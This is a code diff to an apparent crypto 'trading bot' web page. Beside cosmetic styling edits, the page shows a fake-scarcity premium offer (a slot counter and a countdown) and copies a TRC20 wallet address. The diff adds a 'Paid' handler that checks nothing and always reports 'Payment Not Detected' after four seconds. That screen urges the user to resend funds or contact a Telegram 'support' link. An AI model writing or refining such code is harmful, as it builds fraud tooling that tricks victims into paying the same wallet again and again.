@@ -73,7 +73,7 @@ body {
 @media(max-width: 420px){
   .w-[390px] { width: 95vw; }
   .h-[844px] { height: 95vh; }
-  svg text { font-size: 12vw !important; }
+  svg text { font-size: 14vw !important; } /* bigger logo text on mobile */
   #startBtn { padding: 3vw; font-size: 4vw; }
   .dropdown-btn { padding:2.5vw 3vw; font-size:3.5vw; }
 }
@@ -101,11 +101,14 @@ body {
 </head>
 <body class="flex justify-center items-center min-h-screen">
 <div class="w-[390px] h-[844px] rounded-3xl overflow-hidden relative space-bg text-white">
+
   <!-- STARS -->
   <div id="stars"></div>
+
   <!-- HEADER -->
   <div class="flex justify-between items-center px-5 pt-5">
-    <svg id="abroxLogo" class="svg-glow" width="35%" height="auto" viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg">
+    <!-- Updated dynamic logo -->
+    <svg id="abroxLogo" class="svg-glow" viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg" style="width: clamp(200px, 50%, 400px); height: auto;">
       <defs>
         <linearGradient id="abroxGradient" x1="0%" y1="0%" x2="100%" y2="100%">
           <stop offset="0%" stop-color="#ff5fd2"/>
@@ -115,10 +118,11 @@ body {
       </defs>
       <polygon points="300,10 380,60 360,70 300,30 240,70 220,60" fill="url(#abroxGradient)" />
       <polygon points="300,190 380,140 360,130 300,170 240,130 220,140" fill="url(#abroxGradient)" />
-      <text x="300" y="125" text-anchor="middle" font-size="96" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, SF Pro Display, system-ui" fill="url(#abroxGradient)" letter-spacing="4">ABROX</text>
+      <text x="300" y="125" text-anchor="middle" font-size="6vw" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, SF Pro Display, system-ui" fill="url(#abroxGradient)" letter-spacing="4">ABROX</text>
     </svg>
     <div class="bg-cyan-600 px-3 py-1 rounded-lg text-sm font-medium">🇺🇸 en</div>
   </div>
+
   <!-- CONTENT -->
   <div class="px-6 mt-10 relative">
     <h1 class="text-2xl font-semibold tracking-tight">TRADING BOT</h1>
@@ -154,6 +158,7 @@ body {
       <p id="warn" class="text-red-400 text-xs text-center hidden mt-2">Please select currency and timeframe</p>
     </div>
   </div>
+
   <!-- PREMIUM MODAL -->
   <div id="paymentModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-50">
     <div class="bg-[#0a1a2c] w-[90%] max-w-sm rounded-3xl p-6 relative shadow-lg">
@@ -176,16 +181,18 @@ body {
       <span class="absolute top-3 right-3 bg-pink-500 text-white text-xs font-bold px-2 py-1 rounded-full animate-pulse">PREMIUM</span>
     </div>
   </div>
+
   <!-- PROCESSING MODAL -->
   <div id="processingModal" class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 text-white font-mono text-center">
-    <p class="text-cyan-400 text-lg mb-2">⚡ Processing your payment…</p>
+    <p class="text-cyan-400 text-lg mb-2">⚡ Processing your payment<span id="dotAnim" class="dotAnim"></span></p>
     <div class="processing-circle mb-4"><div></div></div>
     <div id="paymentStatus"></div>
-    <div class="mt-2 flex gap-4">
+    <div id="postPaymentActions" class="mt-2 flex gap-4 hidden">
       <button id="retryBtn" class="px-4 py-2 bg-gradient-to-r from-pink-500 to-purple-600 rounded-lg text-white font-semibold hover:scale-105 transition-transform">Retry Payment</button>
       <a href="https://t.me/official_profithunters" target="_blank" class="px-4 py-2 bg-cyan-500 rounded-lg text-white font-semibold hover:scale-105 transition-transform">Contact Support</a>
     </div>
   </div>
+
 </div>
 
 <script>
@@ -200,6 +207,7 @@ for(let i=0;i<40;i++){
   s.style.opacity=Math.random()*0.7+0.3;
   starsContainer.appendChild(s);
 }
+
 // Dropdowns
 let currency=null, timeframe=null;
 function toggleDropdown(id){ document.getElementById(id).classList.toggle("hidden"); }
@@ -212,11 +220,11 @@ document.addEventListener('click', e=>{
     document.getElementById('timeList').classList.add('hidden');
   }
 });
+
 // Premium modal
 let remainingSlots=7, countdown=300;
 const slotCounter=document.getElementById('slotCounter');
 const countdownTimer=document.getElementById('countdownTimer');
-const abroxLogo=document.getElementById('abroxLogo');
 function showPaymentModal(){ const modal=document.getElementById("paymentModal"); modal.classList.remove("hidden"); startCountdown(); }
 function startCountdown(){ clearInterval(window.countdownInterval); countdown=300;
 window.countdownInterval=setInterval(()=>{
@@ -227,18 +235,40 @@ window.countdownInterval=setInterval(()=>{
 },1000);}
 function copyWallet(){ navigator.clipboard.writeText("TY23RUXeNaibpnTnvxxu18qiqtMpDws6yB").then(()=>alert("Wallet address copied")).catch(()=>alert("Copy failed")); }
 
+// Processing Dots Animation
+const dotSpan = document.getElementById('dotAnim');
+let dotCount = 0;
+let dotInterval;
+function startDotAnimation() { clearInterval(dotInterval); dotCount = 0; dotInterval = setInterval(() => { dotCount = (dotCount + 1) % 4; dotSpan.textContent = '.'.repeat(dotCount); }, 500); }
+function stopDotAnimation() { clearInterval(dotInterval); dotSpan.textContent = ''; }
+
 // Paid button
-document.getElementById("paidBtn").onclick=()=>{
+document.getElementById("paidBtn").onclick = () => {
   document.getElementById("paymentModal").classList.add("hidden");
-  const proc=document.getElementById("processingModal"); proc.classList.remove("hidden");
-  const statusDiv=document.getElementById('paymentStatus'); statusDiv.innerHTML='';
-}
+  const proc = document.getElementById("processingModal");
+  proc.classList.remove("hidden");
+  startDotAnimation();
+  const statusDiv = document.getElementById('paymentStatus');
+  const actionsDiv = document.getElementById('postPaymentActions');
+  statusDiv.innerHTML = '';
+  actionsDiv.classList.add('hidden');
+
+  setTimeout(() => {
+    stopDotAnimation();
+    statusDiv.innerHTML = `
+      <p class="text-red-400 font-bold text-lg mb-2">❌ Payment Not Detected</p>
+      <p class="text-white text-sm mb-2">Please resend via TRC20 or contact support:</p>
+    `;
+    actionsDiv.classList.remove('hidden');
+  }, 4000);
+};
 
 // Retry Payment Button
-document.getElementById("retryBtn").onclick = ()=>{
+document.getElementById("retryBtn").onclick = () => {
   document.getElementById("processingModal").classList.add("hidden");
   document.getElementById("paymentModal").classList.remove("hidden");
-}
+  startCountdown();
+};
 </script>
 </body>
 </html>
